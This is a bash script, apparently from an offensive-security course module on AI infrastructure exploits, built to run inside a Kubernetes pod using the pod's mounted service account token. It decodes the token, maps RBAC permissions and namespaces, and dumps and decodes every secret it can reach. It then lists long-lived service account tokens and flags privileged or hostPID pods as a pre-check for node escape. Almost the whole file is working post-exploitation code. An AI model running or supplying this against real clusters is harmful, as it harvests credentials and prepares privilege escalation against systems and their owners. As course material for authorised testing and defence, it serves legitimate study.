#!/usr/bin/env bash
# Script: k8s_ml_enum.sh
# Module: 09 — AI Infrastructure and Deployment Exploits
# Purpose: Enumerate Kubernetes RBAC, secrets, and service accounts from inside a pod
# Usage: bash k8s_ml_enum.sh
# Target: K8s cluster — run from inside a pod with kubectl or using the auto-mounted SA token

TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER="https://kubernetes.default.svc"
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null || echo "default")

echo "=== K8s ML Infrastructure Enumerator ==="
echo "Current namespace: $NS"
echo ""

# Decode the JWT to see SA name and expiry
echo "[*] Service Account Token Info"
if command -v python3 &>/dev/null; then
    echo "$TOKEN" | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
payload = base64.urlsafe_b64decode(parts[1] + '==')
data = json.loads(payload)
print(json.dumps(data, indent=2))
"
fi
echo ""

# What can this SA do?
echo "[*] Current SA permissions (this namespace)"
kubectl auth can-i --list --token="$TOKEN" -n "$NS" 2>/dev/null || \
    curl -s -k -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
    --data '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'"$NS"'"}}' \
    -H "Content-Type: application/json"
echo ""

# ClusterRole detection: run in 2 namespaces and diff
echo "[*] Checking for ClusterRole (comparing permissions across namespaces)"
echo "  --- production ---"
kubectl auth can-i --list --token="$TOKEN" -n production 2>/dev/null | grep -v "^no" | head -20
echo "  --- kube-system ---"
kubectl auth can-i --list --token="$TOKEN" -n kube-system 2>/dev/null | grep -v "^no" | head -20
echo "  [If both outputs are identical, this is a ClusterRole]"
echo ""

# List all namespaces
echo "[*] Namespaces"
kubectl get namespaces --token="$TOKEN" 2>/dev/null
echo ""

# Hunt for secrets in accessible namespaces
echo "[*] Hunting secrets in all accessible namespaces"
for ns in $(kubectl get namespaces --token="$TOKEN" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
    count=$(kubectl get secrets -n "$ns" --token="$TOKEN" 2>/dev/null | grep -v "^NAME" | wc -l)
    echo "  $ns: $count secrets"
    if [ "$count" -gt 0 ]; then
        kubectl get secrets -n "$ns" --token="$TOKEN" 2>/dev/null
        # Try to dump each secret
        for secret in $(kubectl get secrets -n "$ns" --token="$TOKEN" \
            -o jsonpath='{.items[*].metadata.name}' 2>/dev/null); do
            echo "    [+] Dumping: $secret"
            kubectl get secret "$secret" -n "$ns" --token="$TOKEN" \
                -o jsonpath='{.data}' 2>/dev/null | \
                python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
for k,v in data.items():
    try:
        decoded = base64.b64decode(v).decode()
        print(f'  {k}: {decoded}')
    except:
        print(f'  {k}: {v}')
" 2>/dev/null
        done
    fi
done
echo ""

# Service accounts — look for long-lived tokens
echo "[*] Service Account Tokens (look for kubernetes.io/service-account-token type)"
kubectl get secrets --all-namespaces --token="$TOKEN" 2>/dev/null | grep "service-account-token"
echo ""

# Pods — look for privileged, hostPID, hostNetwork
echo "[*] Privileged/HostPID pods"
kubectl get pods --all-namespaces --token="$TOKEN" -o json 2>/dev/null | \
    python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data.get('items', []):
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    spec = item['spec']
    if spec.get('hostPID') or spec.get('hostNetwork') or spec.get('hostIPC'):
        print(f'  [HOSTPID/NET/IPC] {ns}/{name}')
    for c in spec.get('containers', []):
        sc = c.get('securityContext', {})
        if sc.get('privileged'):
            print(f'  [PRIVILEGED] {ns}/{name} container={c[\"name\"]}')
" 2>/dev/null
echo ""

# Check if we can create pods (node escape pre-check)
echo "[*] Can we create pods?"
kubectl auth can-i create pods --token="$TOKEN" -n production 2>/dev/null
kubectl auth can-i create pods --token="$TOKEN" -n kube-system 2>/dev/null
echo ""

echo "=== Done ==="
